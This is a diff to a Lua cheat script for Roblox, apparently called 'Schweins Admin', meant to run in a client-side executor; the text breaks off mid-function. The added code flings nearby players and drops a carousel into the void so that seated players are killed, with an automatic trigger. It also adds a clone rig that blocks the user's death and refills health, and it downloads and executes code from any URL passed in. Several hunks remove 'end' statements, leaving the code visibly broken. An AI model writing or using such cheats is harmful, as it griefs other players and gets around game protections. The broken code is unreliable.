@@ -14527,62 +14527,74 @@ Fn.cmd("Character", { "unspin" }, "unspin", "Stop spinning", function()
 end)
 
 local ahsConns = {}
-local ahsBusy = false
+local ahsConns = {}
 local function ahsClear()
 	for _, c in ipairs(ahsConns) do
-		c:Disconnect()
+		pcall(function() c:Disconnect() end)
 	end
 	ahsConns = {}
 end
-local function ahsVoid()
-	if ahsBusy then
-		return
-	end
-	local r = Fn.rootPart()
-	if not r then
-		return
-	end
-	ahsBusy = true
-	local home = r.CFrame
-	local wasAnchored = r.Anchored
-	local low = workspace.FallenPartsDestroyHeight
-	local y = (low == -math.huge or low < -2000) and -1500 or low + 40
-	r.Anchored = true
-	r.CFrame = CFrame.new(home.X, y, home.Z)
-	task.wait(0.1)
-	r = Fn.rootPart()
-	if r then
-		r.CFrame = home
-		r.AssemblyLinearVelocity = Vector3.zero
-		r.AssemblyAngularVelocity = Vector3.zero
-		r.Anchored = wasAnchored
-	end
-	task.delay(0.5, function()
-		ahsBusy = false
-	end)
-end
+
 local function ahsHook(headOnly)
 	ahsClear()
 	local c = localPlayer.Character
 	if not c then
 		return
 	end
-	for _, part in ipairs(c:GetDescendants()) do
-		if part:IsA("BasePart") then
-			ahsConns[#ahsConns + 1] = part.Touched:Connect(function(other)
-				if ahsBusy then
-					return
+
+	-- Heartbeat check: smooth repellent without teleporting local player
+	ahsConns[#ahsConns + 1] = runService.Heartbeat:Connect(function()
+		local char = localPlayer.Character
+		if not char then return end
+		local head = char:FindFirstChild("Head")
+		local hrp = char:FindFirstChild("HumanoidRootPart")
+		if not hrp then return end
+		local refPos = head and head.Position or hrp.Position
+
+		for _, p in ipairs(players:GetPlayers()) do
+			if p ~= localPlayer and p.Character then
+				local oChar = p.Character
+				local oHrp = oChar:FindFirstChild("HumanoidRootPart")
+				if oHrp then
+					local diff = oHrp.Position - refPos
+					local hDist = Vector2.new(diff.X, diff.Z).Magnitude
+					-- If another player is directly above our head or standing on us
+					if hDist < 2.8 and diff.Y > -0.6 and diff.Y < 4.5 then
+						local pushDir = Vector3.new(diff.X, 0, diff.Z)
+						if pushDir.Magnitude > 0.05 then
+							pushDir = pushDir.Unit * 65 + Vector3.new(0, 35, 0)
+						else
+							pushDir = Vector3.new(math.random(-1, 1) * 30, 45, math.random(-1, 1) * 30)
+						end
+						pcall(function()
+							oHrp.AssemblyLinearVelocity = pushDir
+						end)
+						local oHum = oChar:FindFirstChildOfClass("Humanoid")
+						if oHum and oHum.Sit then
+							oHum.Sit = false
+						end
+					end
 				end
-				local model = other:FindFirstAncestorOfClass("Model")
-				local p = model and players:GetPlayerFromCharacter(model)
-				if p and p ~= localPlayer and (not headOnly or part.Name == "Head") then
-					task.spawn(ahsVoid)
-				end
-			end)
+			end
 		end
-	end
+	end)
+
+	-- Stepped check: disable collision on head so enemies cannot sit or stand on it
+	ahsConns[#ahsConns + 1] = runService.Stepped:Connect(function()
+		local char = localPlayer.Character
+		if not char then return end
+		local head = char:FindFirstChild("Head")
+		if head then
+			head.CanCollide = false
+		end
+		local torso = char:FindFirstChild("Torso") or char:FindFirstChild("UpperTorso")
+		if torso and not headOnly then
+			torso.CanCollide = false
+		end
+	end)
 end
-Fn.toggle("Character", "antiheadsit", "antiheadsit [head]", "Void for 0.1s when another player touches you, then come back safely", {
+
+Fn.toggle("Character", "antiheadsit", "antiheadsit [head]", "Prevent other players from sitting or standing on your head", {
 	title = "Anti Headsit", persist = true, aliases = { "ahs", "noheadsit" },
 	on = function(args)
 		local headOnly = lower(args[1] or "") == "head"
@@ -14597,6 +14609,11 @@ Fn.toggle("Character", "antiheadsit", "antiheadsit [head]", "Void for 0.1s when 
 		if Fn.ahsConn then
 			Fn.ahsConn:Disconnect()
 			Fn.ahsConn = nil
+		end
+		local char = localPlayer.Character
+		if char then
+			local head = char:FindFirstChild("Head")
+			if head then head.CanCollide = true end
 		end
 	end,
 })
@@ -15398,7 +15415,7 @@ end
 
 function NT.default()
 	local hex = toHex(Fn.theme().accent)
-	return NT.sanitize({ name = "SA user", display = "Schweins Admin", nameColor = hex, displayColor = hex })
+	return NT.sanitize({ name = "SA admin", display = "Schweins Admin", nameColor = hex, displayColor = hex })
 end
 
 function NT.simplify(p)
@@ -16011,7 +16028,11 @@ local function fetchProfiles()
 	if not res or type(res.Body) ~= "string" or #res.Body > 524288 then
 		return false
 	end
-	local body = string.gsub(res.Body, ",(%s*[}%]])", "%1")
+	local rawBody = res.Body
+	if not string.match(rawBody, "^%s*{") then
+		rawBody = "{\n" .. rawBody .. "\n}"
+	end
+	local body = string.gsub(rawBody, ",(%s*[}%]])", "%1")
 	local ok, data = pcall(httpService.JSONDecode, httpService, body)
 	if not ok or type(data) ~= "table" then
 		return false
@@ -18060,34 +18081,41 @@ do
 	end
 
 	local function driveStep(dt)
-		local c = Reanim.char
-		if not (Reanim.active and c and c.Parent) then
+		local clone = Reanim.clone or Reanim.char
+		local real = Reanim.realChar or localPlayer.Character
+		if not (Reanim.active and clone and clone.Parent) then
 			return Fn.stopReanim(true)
 		end
-		if localPlayer.Character ~= c then
+		if Reanim.isServerReanimated and not (real and real.Parent) then
 			return Fn.stopReanim(true)
 		end
-		local h = c:FindFirstChildOfClass("Humanoid")
-		local animate = c:FindFirstChild("Animate")
-		if animate then
+
+		-- Keep real humanoid alive & disable dead state
+		if Reanim.isServerReanimated and real then
+			local rh = real:FindFirstChildOfClass("Humanoid")
+			if rh and rh.Parent and rh.Health < rh.MaxHealth then
+				rh.Health = rh.MaxHealth
+			end
+		end
+
+		local h = clone:FindFirstChildOfClass("Humanoid")
+		local animate = clone:FindFirstChild("Animate")
+		if animate and not animate.Disabled then
 			animate.Disabled = true
 			Reanim.animate = animate
 		end
 		if h then
 			for _, tr in ipairs(h:GetPlayingAnimationTracks()) do
-				pcall(function()
-					tr:Stop(0)
-				end)
+				pcall(function() tr:Stop(0) end)
 			end
 			local animator = h:FindFirstChildOfClass("Animator")
 			if animator then
 				for _, tr in ipairs(animator:GetPlayingAnimationTracks()) do
-					pcall(function()
-						tr:Stop(0)
-					end)
+					pcall(function() tr:Stop(0) end)
 				end
 			end
 		end
+
 		if Reanim.playing and Reanim.clip then
 			local len = Reanim.clip.length or 0
 			local nextTime = Reanim.time + (dt or 0.016) * (Reanim.speed or 1)
@@ -18104,14 +18132,22 @@ do
 			table.clear(Reanim.pose)
 			sampleClip(Reanim.clip, Reanim.time, Reanim.pose)
 		end
+
 		local studio = Fn.KF
 		for name, cf in pairs(Reanim.pose) do
 			if typeof(cf) == "CFrame" then
 				local j = findJoint(name)
 				if j and j.Parent and not Reanim.override[name] then
 					if not (studio and studio.engaged and studio.pose and studio.pose[name]) then
+						if j:IsA("Motor6D") then
+							local base = Reanim.baseC0 and Reanim.baseC0[j]
+							if not base then
+								base = j.C0
+								Reanim.baseC0[j] = base
+							end
+							j.C0 = base * cf
+						end
 						j.Transform = cf
-					end
 				end
 			end
 		end
@@ -18119,14 +18155,44 @@ do
 			if typeof(cf) == "CFrame" then
 				local j = findJoint(name)
 				if j and j.Parent then
-					j.Transform = cf
+					if j:IsA("Motor6D") then
+						local base = Reanim.baseC0 and Reanim.baseC0[j]
+						if not base then
+							base = j.C0
+							Reanim.baseC0[j] = base
+						end
+						j.C0 = base * cf
 				end
+				j.Transform = cf
+			end
+		end
+
+		-- Server-Replication Physics Alignment (Novoline / M7-V2 Netless Physics)
+		if Reanim.isServerReanimated and real and clone then
+			local realHRP = real:FindFirstChild("HumanoidRootPart")
+			for _, realPart in ipairs(real:GetChildren()) do
+				if realPart:IsA("BasePart") and realPart ~= realHRP then
+					local clonePart = clone:FindFirstChild(realPart.Name)
+					if clonePart and clonePart:IsA("BasePart") then
+						realPart.CFrame = clonePart.CFrame
+						realPart.AssemblyLinearVelocity = Vector3.new(0, 25.1, 0)
+						realPart.AssemblyAngularVelocity = Vector3.zero
+					end
+				elseif realPart:IsA("Accessory") then
+					local rHandle = realPart:FindFirstChild("Handle")
+					local cAcc = clone:FindFirstChild(realPart.Name)
+					local cHandle = cAcc and cAcc:FindFirstChild("Handle")
+					if rHandle and cHandle and rHandle:IsA("BasePart") and cHandle:IsA("BasePart") then
+						rHandle.CFrame = cHandle.CFrame
+						rHandle.AssemblyLinearVelocity = Vector3.new(0, 25.1, 0)
+						rHandle.AssemblyAngularVelocity = Vector3.zero
+					end
 			end
 		end
 	end
 
 	function Fn.reanimTakeControl(onReady)
-		if Reanim.active and Reanim.char == localPlayer.Character then
+		if Reanim.active and (Reanim.clone or Reanim.char) == localPlayer.Character then
 			if onReady then task.defer(onReady) end
 			return
 		end
@@ -18143,8 +18209,8 @@ do
 			if not c then c = localPlayer.CharacterAdded:Wait() end
 			if token ~= Reanim.token then return end
 			local hum = c:FindFirstChildOfClass("Humanoid") or c:WaitForChild("Humanoid", 10)
-			c:WaitForChild("HumanoidRootPart", 10)
-			if not hum then
+			local hrp = c:WaitForChild("HumanoidRootPart", 10)
+			if not (hum and hrp) then
 				Reanim.pending = false
 				Reanim.pendingCallbacks = {}
 				return Fn.notify("Reanim", "Your character never loaded.", "warn")
@@ -18154,35 +18220,94 @@ do
 				Reanim.pending = false
 				return
 			end
-			local joints, folded = jointsOf(c)
+
+			-- Build Server-Replicated Clone Rig (from Novoline & M7-V2)
+			c.Archivable = true
+			local clone = c:Clone()
+			c.Archivable = false
+			clone.Name = "Reanimation"
+			clone.Parent = workspace
+			local cloneHum = clone:FindFirstChildOfClass("Humanoid")
+			local cloneHRP = clone:FindFirstChild("HumanoidRootPart")
+			if cloneHum then
+				cloneHum.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.None
+				cloneHum.RequiresNeck = false
+			end
+			for _, d in ipairs(clone:GetDescendants()) do
+				if d:IsA("ForceField") then pcall(d.Destroy, d) end
+			end
+
+			-- Configure real character for netless physics
+			pcall(function()
+				hum:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
+				hum.BreakJointsOnDeath = false
+			end)
+			Reanim.realParts = {}
+			for _, d in ipairs(c:GetDescendants()) do
+				if d:IsA("BasePart") then
+					Reanim.realParts[d] = { Massless = d.Massless, CanCollide = d.CanCollide }
+					pcall(function() d.Massless = true end)
+					if d ~= hrp then
+						pcall(function() d.CanCollide = false end)
+					end
+				end
+			end
+
+			-- PuppetRoot Motor6D to synchronize root CFrame across engine
+			if cloneHRP and hrp then
+				local puppet = Instance.new("Motor6D")
+				puppet.Name = "PuppetRoot"
+				puppet.Part0 = cloneHRP
+				puppet.Part1 = hrp
+				puppet.C0 = CFrame.identity
+				puppet.C1 = CFrame.identity
+				puppet.Parent = cloneHRP
+				Reanim.puppetWeld = puppet
+			end
+
+			-- Switch active player character to the clone
+			localPlayer.Character = clone
+			if workspace.CurrentCamera and cloneHum then
+				workspace.CurrentCamera.CameraSubject = cloneHum
+			end
+
+			local joints, folded = jointsOf(clone)
 			local unique, count = {}, 0
 			for _, joint in pairs(joints) do
 				if not unique[joint] then unique[joint] = true; count += 1 end
 			end
-			if count == 0 then
-				Reanim.pending = false
-				Reanim.pendingCallbacks = {}
-				return Fn.notify("Reanim", "No supported animation joints were found on this avatar.", "warn")
-			end
-			local animate = c:FindFirstChild("Animate")
+
+			local animate = clone:FindFirstChild("Animate")
 			if animate then animate.Disabled = true end
-			for _, d in ipairs(c:GetDescendants()) do
+			for _, d in ipairs(clone:GetDescendants()) do
 				if d:IsA("Animator") then
 					for _, tr in ipairs(d:GetPlayingAnimationTracks()) do
 						pcall(function() tr:Stop(0) end)
 					end
 				end
 			end
-			stopTracks(hum)
-			Reanim.char, Reanim.animate = c, animate
+			stopTracks(cloneHum)
+
+			Reanim.char = clone
+			Reanim.realChar = c
+			Reanim.clone = clone
+			Reanim.isServerReanimated = true
+			Reanim.animate = animate
 			Reanim.joints, Reanim.foldedJoints = joints, folded
+			Reanim.baseC0 = {}
+			for _, j in pairs(joints) do
+				if j:IsA("Motor6D") and not Reanim.baseC0[j] then
+					Reanim.baseC0[j] = j.C0
+				end
+			end
 			Reanim.pose, Reanim.override, Reanim.clip = {}, {}, nil
 			Reanim.playing, Reanim.active, Reanim.time = false, true, 0
 			Reanim.speed = Reanim.speed or 1
 			Reanim.pending = false
 			if Reanim.connection then Reanim.connection:Disconnect() end
 			Reanim.connection = runService.PreSimulation:Connect(driveStep)
-			Fn.notify("Reanim", "Active (" .. count .. " joints). Choose a keyframe to play.", "ok")
+
+			Fn.notify("Reanim", "Server-Reanimated (" .. count .. " joints active via Netless Physics)!", "ok")
 			local callbacks = Reanim.pendingCallbacks or {}
 			Reanim.pendingCallbacks = {}
 			for _, callback in ipairs(callbacks) do task.spawn(callback) end
@@ -18200,7 +18325,7 @@ do
 				for name in pairs(frame.Data) do
 					if findJoint(name) then matched = true break end
 				end
-				if matched then break end
+			if matched then break end
 			end
 			if not matched then
 				return Fn.notify("Reanim", "These keyframes do not match the joints on this avatar.", "warn")
@@ -18209,11 +18334,11 @@ do
 			Reanim.loop = loop ~= false and Reanim.loop
 			if loop == false then Reanim.loop = false end
 			Reanim.time, Reanim.playing, Reanim.label = 0, true, label
-			Fn.notify("Reanim", ("Playing %s (%d keyframes, %.1fs)"):format(label, #frames, Reanim.clip.length), "ok")
+			Fn.notify("Reanim", ("Playing %s (%d keyframes, %.1fs) [Replicating to Server]"):format(label, #frames, Reanim.clip.length), "ok")
 			local win = W.dockWindows and W.dockWindows.Reanim
 			if win and win.refresh then win.refresh() end
 		end
-		if Reanim.active and Reanim.char == localPlayer.Character then start() else Fn.reanimTakeControl(start) end
+		if Reanim.active and (Reanim.clone or Reanim.char) == localPlayer.Character then start() else Fn.reanimTakeControl(start) end
 	end
 
 	function Fn.stopReanim(silent)
@@ -18223,7 +18348,33 @@ do
 			Reanim.connection:Disconnect()
 			Reanim.connection = nil
 		end
+		if Reanim.puppetWeld and Reanim.puppetWeld.Parent then
+			pcall(Reanim.puppetWeld.Destroy, Reanim.puppetWeld)
+			Reanim.puppetWeld = nil
+		end
+		if Reanim.clone and Reanim.clone.Parent then
+			pcall(Reanim.clone.Destroy, Reanim.clone)
+			Reanim.clone = nil
+		end
 		if wasActive then
+			local real = Reanim.realChar or localPlayer.Character
+			if real and real.Parent then
+				localPlayer.Character = real
+				local rh = real:FindFirstChildOfClass("Humanoid")
+				if workspace.CurrentCamera and rh then
+					workspace.CurrentCamera.CameraSubject = rh
+				end
+				for part, props in pairs(Reanim.realParts or {}) do
+					if part and part.Parent then
+						pcall(function()
+							part.Massless = props.Massless
+							part.CanCollide = props.CanCollide
+						end)
+					end
+				end
+				local animate = real:FindFirstChild("Animate")
+				if animate then animate.Disabled = false end
+			end
 			for j, base in pairs(Reanim.baseC0 or {}) do
 				pcall(function()
 					if j and j.Parent then
@@ -18239,10 +18390,12 @@ do
 					end
 				end)
 			end
-			if Reanim.animate and Reanim.animate.Parent then Reanim.animate.Disabled = false end
+			Reanim.realChar, Reanim.clone = nil, nil
+			Reanim.isServerReanimated = false
+			Reanim.realParts = {}
 			Reanim.animate, Reanim.char = nil, nil
 			Reanim.pose, Reanim.override, Reanim.baseC0 = {}, {}, {}
-			if not silent then Fn.notify("Reanim", "Released. Your normal animations are back.", "info") end
+			if not silent then Fn.notify("Reanim", "Released. Your real avatar is restored.", "info") end
 		end
 	end
 	Fn.onCleanup(function() Fn.stopReanim(true) end)
@@ -19021,7 +19174,7 @@ do
 	end
 
 	local AntiAttach = { on = false, lastSafe = nil, cooldown = 0 }
-	Fn.toggle("Movement", "antiattach", "antiattach", "If something flings or attaches you into the void, snap back to solid ground", {
+	Fn.toggle("Movement", "antiattach", "antiattach", "Prevent foreign tools, welds and flings from latching onto you", {
 		title = "Anti Attach", persist = true, aliases = { "aa", "noattach" },
 		on = function()
 			AntiAttach.on = true
@@ -19035,35 +19188,41 @@ do
 				if pos.Y > -50 and h.FloorMaterial ~= Enum.Material.Air then
 					AntiAttach.lastSafe = hrp.CFrame
 				end
-				local falling = pos.Y < -50 or (h.Health > 0 and pos.Y < workspace.FallenPartsDestroyHeight + 20)
-				local weird = false
+
+				-- Destroy any foreign attachment constraints / body movers on our character
 				for _, d in ipairs(c:GetDescendants()) do
 					if d:IsA("BodyVelocity") or d:IsA("BodyAngularVelocity") or d:IsA("BodyForce") or d:IsA("LinearVelocity") or d:IsA("AngularVelocity") or d:IsA("VectorForce") then
 						if d.Parent and d.Parent ~= hrp then
-							weird = true
+							pcall(function() d:Destroy() end)
 						end
 					end
-					if d:IsA("Weld") or d:IsA("WeldConstraint") or d:IsA("Motor6D") then
+					if d:IsA("Weld") or d:IsA("WeldConstraint") or d:IsA("Motor6D") or d:IsA("RopeConstraint") or d:IsA("SpringConstraint") or d:IsA("RodConstraint") or d:IsA("BallSocketConstraint") or d:IsA("AlignPosition") then
 						if d.Part0 and d.Part1 then
 							local other = (d.Part0:IsDescendantOf(c) and d.Part1) or (d.Part1:IsDescendantOf(c) and d.Part0)
 							if other and not other:IsDescendantOf(c) and other.Parent and other.Parent ~= workspace.CurrentCamera then
 								local op = other.Parent
 								if op and op:FindFirstChildOfClass("Humanoid") and op ~= localPlayer then
-									weird = true
 									pcall(function() d:Destroy() end)
 								end
 							end
 						end
 					end
 				end
-				if (falling or weird) and AntiAttach.lastSafe and (os.clock() - (AntiAttach.cooldown or 0)) > 0.35 then
+
+				-- Absorb foreign fling impulses cleanly without popping up
+				if hrp.AssemblyLinearVelocity.Magnitude > 300 and not (Fn.Actions and Fn.Actions[2] and Fn.Actions[2].enabled) then
+					hrp.AssemblyLinearVelocity = Vector3.zero
+					hrp.AssemblyAngularVelocity = Vector3.zero
+				end
+
+				-- Only restore position if ACTUALLY falling into the void
+				local low = workspace.FallenPartsDestroyHeight
+				local voidLimit = (low == -math.huge or low < -2000) and -250 or (low + 35)
+				if pos.Y < voidLimit and AntiAttach.lastSafe and (os.clock() - (AntiAttach.cooldown or 0)) > 1.2 then
 					AntiAttach.cooldown = os.clock()
 					hrp.AssemblyLinearVelocity = Vector3.zero
 					hrp.AssemblyAngularVelocity = Vector3.zero
-					hrp.CFrame = AntiAttach.lastSafe + Vector3.new(0, 3, 0)
-					if h.Health < h.MaxHealth * 0.15 then
-						h.Health = math.max(h.Health, h.MaxHealth * 0.5)
-					end
+					hrp.CFrame = AntiAttach.lastSafe
 				end
 			end, runService.Heartbeat)
 		end,
@@ -19316,19 +19475,53 @@ do
 		local origPlayReanim = Fn.playReanim
 		if type(origPlayReanim) == "function" then
 			function Fn.playReanim(query)
-				local text = tostring(query or "")
-				local id = text:match("^%s*(%d+)%s*$") or text:match("rbxassetid://(%d+)")
-				if id and Fn.Anim and Fn.Anim.play then
-					if Fn.Reanim and Fn.Reanim.active then
-						Fn.stopReanim(true)
+				local qStr = tostring(query or "")
+				local id = qStr:match("^%s*(%d+)%s*$") or qStr:match("rbxassetid://(%d+)")
+				if id then
+					local function playId()
+						local char = (Fn.Reanim and Fn.Reanim.clone) or localPlayer.Character
+						local hum = char and char:FindFirstChildOfClass("Humanoid")
+						local animator = hum and (hum:FindFirstChildOfClass("Animator") or Instance.new("Animator", hum))
+						if animator then
+							local anim = Instance.new("Animation")
+							anim.AnimationId = "rbxassetid://" .. id
+							local ok, tr = pcall(function() return animator:LoadAnimation(anim) end)
+							if ok and tr then
+								tr.Looped = not (Fn.Reanim and Fn.Reanim.loop == false)
+								tr:Play()
+								Fn.notify("Reanim", "Playing " .. id .. " (replicated to server via Netless Rig)!", "ok")
+								return
+							end
+						end
 					end
-					Fn.Anim.play(id, "Animation " .. id, "anim", { looped = not (Fn.Reanim and Fn.Reanim.loop == false) })
-					Fn.notify("Reanim", "Playing " .. id .. " through your Animator, which other players can see.", "ok")
+					if Fn.Reanim and Fn.Reanim.active and Fn.Reanim.clone then playId() else Fn.reanimTakeControl(playId) end
 					return
 				end
-				local result = origPlayReanim(query)
-				Fn.notify("Reanim", "Saved keyframe clips pose your joints locally. Only animation ids play for other players.", "info")
-				return result
+
+				if qStr:match("^https?://") then
+					task.spawn(function()
+						Fn.notify("Reanim", "Fetching online animation script...", "info")
+						local ok, code = pcall(function() return game:HttpGet(qStr) end)
+						if ok and type(code) == "string" and code ~= "" then
+							local chunk = loadstring(code)
+							if type(chunk) == "function" then
+								local okRun, err = pcall(chunk)
+								if okRun then
+									Fn.notify("Reanim", "Executed online animation script.", "ok")
+								else
+									Fn.notify("Reanim", "Script error: " .. tostring(err):sub(1, 40), "warn")
+								end
+							else
+								Fn.notify("Reanim", "Invalid script chunk.", "warn")
+							end
+						else
+							Fn.notify("Reanim", "Failed to fetch animation from URL.", "warn")
+						end
+					end)
+					return
+				end
+
+				return origPlayReanim(query)
 			end
 		end
 	end
@@ -19336,22 +19529,860 @@ end
 
 do
 	local keyFile = "1842919jaetgaksuga9.txt"
+
+	local function generateRandomProfile()
+		local roll = math.random(1, 100)
+		local tier, nameColor, nameColor2, borderColor, borderColor2, textAnim, borderStyle, effect, glow
+		if roll <= 5 then
+			-- Legendary / Secret (5% chance)
+			tier = "Legendary"
+			nameColor, nameColor2 = "ff007f", "7928ca"
+			borderColor, borderColor2 = "ff007f", "00f0ff"
+			textAnim = "rainbow"
+			borderStyle = "rainbow"
+			effect = "sparkles"
+			glow = true
+		elseif roll <= 20 then
+			-- Rare (15% chance)
+			tier = "Rare"
+			local variants = {
+				{ "ffd700", "ff8f00", "ffd700", "pulse", "sparkles" },
+				{ "00e5ff", "2979ff", "00e5ff", "gradient", "sparkles" },
+				{ "ec407a", "7e57c2", "ec407a", "pulse", "embers" },
+				{ "00ff88", "00b4d8", "00ff88", "wave", "sparkles" },
+			}
+			local v = variants[math.random(1, #variants)]
+			nameColor, nameColor2, borderColor, borderStyle, effect = v[1], v[2], v[3], v[4], v[5]
+			borderColor2 = nameColor2
+			textAnim = "gradient"
+			glow = true
+		elseif roll <= 50 then
+			-- Uncommon (30% chance)
+			tier = "Uncommon"
+			local colors = { "ef5350", "ab47bc", "ffa726", "26c6da", "66bb6a", "ff7043", "42a5f5" }
+			local c = colors[math.random(1, #colors)]
+			nameColor, nameColor2, borderColor, borderColor2 = c, c, c, c
+			textAnim = "pulse"
+			borderStyle = "solid"
+			effect = "none"
+			glow = true
+		else
+			-- Common (50% chance)
+			tier = "Common"
+			local colors = { "64b5f6", "81c784", "90a4ae", "ffffff", "b0bec5", "4dd0e1", "aed581" }
+			local c = colors[math.random(1, #colors)]
+			nameColor, nameColor2, borderColor, borderColor2 = c, c, c, c
+			textAnim = "none"
+			borderStyle = "solid"
+			effect = "none"
+			glow = false
+		end
+
+		return Fn.NT.sanitize({
+			name = "SA admin",
+			display = "Schweins Admin",
+			nameColor = nameColor,
+			nameColor2 = nameColor2,
+			displayColor = nameColor,
+			displayColor2 = nameColor2,
+			font = "GothamBold",
+			nameAnim = textAnim,
+			displayAnim = "none",
+			bg = {
+				type = "color",
+				color = "101018",
+				color2 = "1c1c2e",
+				transparency = 0.2,
+				dim = 0.45,
+			},
+			border = {
+				style = borderStyle,
+				color = borderColor,
+				color2 = borderColor2,
+				thickness = 2,
+				corner = 10,
+				glow = glow,
+			},
+			effect = effect,
+			bgEffect = "none",
+			scale = 1,
+		}), tier
+	end
+
 	local prevStartKey = Fn.start
 	function Fn.start()
 		local result = prevStartKey()
-		pcall(function()
-			local path = folderPath(keyFile)
-			if isfile and readfile and isfile(path) then
-				local raw = string.gsub(readfile(path), "%s+", "")
-				local prof = Fn.NT.fromEntry(raw)
-				if prof then
-					Fn.setMyProfile(prof)
+		task.spawn(function()
+			task.wait(0.5)
+			pcall(function()
+				-- Check if user is inside GitHub repository
+				local myId = localPlayer.UserId
+				local ghProf = Fn.SA and Fn.SA.profiles and Fn.SA.profiles[myId]
+				if ghProf then
+					Fn.setMyProfile(ghProf)
+					return
 				end
-			end
+
+				-- User is NOT in GitHub repo: check local key file
+				local path = folderPath(keyFile)
+				local hasFile = isfile and readfile and isfile(path)
+				if hasFile then
+					local raw = string.gsub(readfile(path), "%s+", "")
+					local prof = Fn.NT and Fn.NT.fromEntry and Fn.NT.fromEntry(raw)
+					if prof then
+						if string.find(string.lower(tostring(prof.name or "")), "wifey", 1, true) or string.find(tostring(prof.name or ""), "<3", 1, true) then
+							prof.name = "SA admin"
+						end
+						Fn.setMyProfile(prof)
+						return
+				end
+				end
+
+				-- First time execution for free user: generate randomized colored .txt profile
+				local prof, tier = generateRandomProfile()
+				if prof then
+					local encoded = Fn.NT and Fn.NT.encode and Fn.NT.encode(prof)
+					if encoded and writefile then
+						pcall(writefile, path, encoded)
+					end
+					if Values and type(Values.sa_mine) == "string" and (string.find(string.lower(Values.sa_mine), "wifey", 1, true) or string.find(Values.sa_mine, "<3", 1, true)) then
+						Values.sa_mine = encoded or ""
+						pcall(Fn.saveSettings)
+					end
+					Fn.setMyProfile(prof)
+					Fn.notify("Nametag", "Free user nametag rolled! Rarity: " .. tostring(tier), "ok")
+				end
+			end)
 		end)
 		return result
 	end
 end
+
+do
+	local carousel = {
+		on = false,
+		conn = nil,
+		steppedConn = nil,
+		model = nil,
+		seat = nil,
+		seats = {},
+		speed = 70,
+		fling = false,
+		noclip = true,
+		flipped = true, -- true = upright (corrected from inverted 0 pitch), false = standard 0
+		autoVoidKill = false, -- toggle: the moment someone sits in a seat, it voids
+		yaw = 0,
+		pos = nil,
+		voiding = false,
+		origJumpPower = nil,
+		origJumpHeight = nil,
+	}
+
+	local function findModel()
+		local map = workspace:FindFirstChild("map")
+		local car = map and map:FindFirstChild("carousel")
+		if car and car:FindFirstChild("Model") then
+			return car:FindFirstChild("Model")
+		end
+		if car and car:IsA("Model") then
+			return car
+		end
+		for _, obj in ipairs(workspace:GetDescendants()) do
+			if obj:IsA("Model") and string.lower(obj.Name) == "carousel" then
+				local inner = obj:FindFirstChild("Model")
+				return inner or obj
+			end
+		end
+		return nil
+	end
+
+	local function stopCarousel(silent)
+		if not carousel.on then
+			return
+		end
+		carousel.on = false
+		if carousel.conn then
+			carousel.conn:Disconnect()
+			carousel.conn = nil
+		end
+		if carousel.steppedConn then
+			carousel.steppedConn:Disconnect()
+			carousel.steppedConn = nil
+		end
+
+		local hum = Fn.humanoid()
+		if hum then
+			pcall(function()
+				hum:SetStateEnabled(Enum.HumanoidStateType.Jumping, true)
+				if carousel.origJumpPower ~= nil then
+					hum.JumpPower = carousel.origJumpPower
+				end
+				if carousel.origJumpHeight ~= nil then
+					hum.JumpHeight = carousel.origJumpHeight
+				end
+			end)
+		end
+
+		if carousel.model and carousel.model.Parent then
+			for _, d in ipairs(carousel.model:GetDescendants()) do
+				if d:IsA("BasePart") and not d.Anchored then
+					pcall(function()
+						d.AssemblyLinearVelocity = Vector3.zero
+						d.AssemblyAngularVelocity = Vector3.zero
+						d.CanCollide = true
+					end)
+				end
+			end
+		end
+
+		carousel.model = nil
+		carousel.seat = nil
+		carousel.seats = {}
+		carousel.pos = nil
+		carousel.voiding = false
+
+		if not silent then
+			Fn.notify("Carousel", "Stopped", "info")
+		end
+
+		local win = W.dockWindows and W.dockWindows.Carousel
+		if win and win.refresh then
+			win.refresh()
+		end
+	end
+
+	local function voidDrop()
+		if not carousel.on or not carousel.model or not carousel.model.Parent then
+			return Fn.notify("Carousel", "Carousel is not currently active.", "warn")
+		end
+		if carousel.voiding then
+			return
+		end
+		carousel.voiding = true
+
+		local hum = Fn.humanoid()
+		local root = Fn.rootPart()
+		local seat = carousel.seat
+		local model = carousel.model
+
+		local currentPos = carousel.pos or model:GetPivot().Position
+		local currentYaw = carousel.yaw or 0
+		local pitch = carousel.flipped and math.pi or 0
+
+		-- FREEZE CAMERA IN PLACE so it never follows character or drops down into the void
+		local cam = workspace.CurrentCamera
+		local savedCamCFrame = cam.CFrame
+		local savedCamType = cam.CameraType
+		local savedCamSubject = cam.CameraSubject
+
+		pcall(function()
+			cam.CameraType = Enum.CameraType.Scriptable
+			cam.CFrame = savedCamCFrame
+		end)
+
+		-- Anti-void protection for local player: hold stationary at safe altitude
+		if hum then
+			pcall(function()
+				hum.Sit = false
+			end)
+		end
+		if root then
+			pcall(function()
+				root.Anchored = true
+				root.CFrame = CFrame.new(currentPos + Vector3.new(0, 5, 0))
+				root.AssemblyLinearVelocity = Vector3.zero
+				root.AssemblyAngularVelocity = Vector3.zero
+			end)
+		end
+
+		Fn.notify("Carousel", "Void drop triggered!", "warn")
+
+		-- Drop carousel 10,000 studs down
+		local voidPos = currentPos - Vector3.new(0, 10000, 0)
+		pcall(function()
+			model:PivotTo(CFrame.new(voidPos) * CFrame.Angles(pitch, currentYaw, 0))
+			for _, d in ipairs(model:GetDescendants()) do
+				if d:IsA("BasePart") then
+					d.AssemblyLinearVelocity = Vector3.new(0, -10000, 0)
+				end
+			end
+		end)
+
+		-- Keep camera strictly at saved position during the drop
+		cam.CFrame = savedCamCFrame
+
+		-- Short pause so server kills victims at FallenPartsDestroyHeight
+		task.wait(0.35)
+		cam.CFrame = savedCamCFrame
+
+		-- Instant snap back up
+		pcall(function()
+			model:PivotTo(CFrame.new(currentPos) * CFrame.Angles(pitch, currentYaw, 0))
+			for _, d in ipairs(model:GetDescendants()) do
+				if d:IsA("BasePart") then
+					d.AssemblyLinearVelocity = Vector3.zero
+					d.AssemblyAngularVelocity = Vector3.zero
+				end
+			end
+		end)
+
+		task.wait(0.05)
+		-- Re-seat local player safely
+		if root and seat then
+			pcall(function()
+				root.Anchored = false
+				root.CFrame = seat.CFrame * CFrame.new(0, 2, 0)
+			end)
+		end
+		if hum and seat then
+			pcall(function()
+				seat:Sit(hum)
+			end)
+		end
+
+		-- Restore camera safely without sudden jerks
+		pcall(function()
+			cam.CFrame = savedCamCFrame
+			cam.CameraType = savedCamType or Enum.CameraType.Custom
+			if savedCamSubject then
+				cam.CameraSubject = savedCamSubject
+			elseif hum then
